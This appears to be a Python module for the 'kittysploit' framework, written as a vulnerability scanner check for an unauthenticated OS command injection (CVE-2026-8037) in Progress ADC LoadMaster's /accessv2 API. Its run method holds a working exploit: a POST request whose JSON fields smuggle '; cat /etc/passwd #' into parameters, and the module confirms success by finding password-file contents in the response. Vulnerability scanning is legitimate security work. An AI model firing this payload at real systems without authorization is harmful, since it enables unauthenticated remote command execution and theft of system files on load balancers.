#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Progress ADC LoadMaster - Command Injection"""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        "name": 'Progress ADC LoadMaster - Command Injection',
        "description": 'Unauthenticated OS command injection in Progress ADC LoadMaster /accessv2 API.',
        "author": ["KittySploit Team"],
        "severity": 'critical',
        "cve": 'CVE-2026-8037',
        "tags": ['web', 'scanner', 'cve', 'cve2026', 'vuln', 'progress', 'loadmaster', 'rce', 'vkev'],
        "agent": {
            "risk": "active",
            "effects": ["network_probe"],
            "expected_requests": 1,
            "reversible": True,
            "approval_required": False,
            "produces": ["tech_hints", "risk_signals", "endpoints"],
            "cost": 1.0,
            "noise": 0.2,
            "value": 1.0,
        },
        "references": ['https://community.progress.com/s/article/LoadMaster-Critical-Security-Bulletin-June-2026-CVE-2026-8037-CVE-2026-33691', 'https://labs.watchtowr.com/enterprise-tech-in-shell-out-progress-kemp-loadmaster-uninitialized-heap-to-pre-auth-rce-cve-2026-8037/', 'https://nvd.nist.gov/vuln/detail/CVE-2026-8037'],
    }

    def run(self):
        data = '{"cmd": "getall", "apiuser": "\'\'\'\'", "apipass": "BBBBB", "g0": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g1": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g2": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g3": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g4": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g5": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g6": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g7": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g8": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g9": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g10": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g11": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g12": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g13": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g14": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #", "g15": "AAAAAAAAAAAAAAAA"; cat /etc/passwd #"}'
        r = self.http_request(
            method="POST",
            path="/accessv2",
            headers={"Content-Type": "application/json", "Accept": "*/*"},
            data=data,
            allow_redirects=False,
        )
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        ctype = (r.headers.get("Content-Type") or r.headers.get("content-type") or "").lower()
        if "json" not in ctype:
            return False
        if "root:x:0:0:" not in body:
            return False
        self.set_info(
            severity="critical",
            cve="CVE-2026-8037",
            reason="LoadMaster /accessv2 returned /etc/passwd via command injection",
            path="/accessv2",
            confidence="high",
        )
        return True
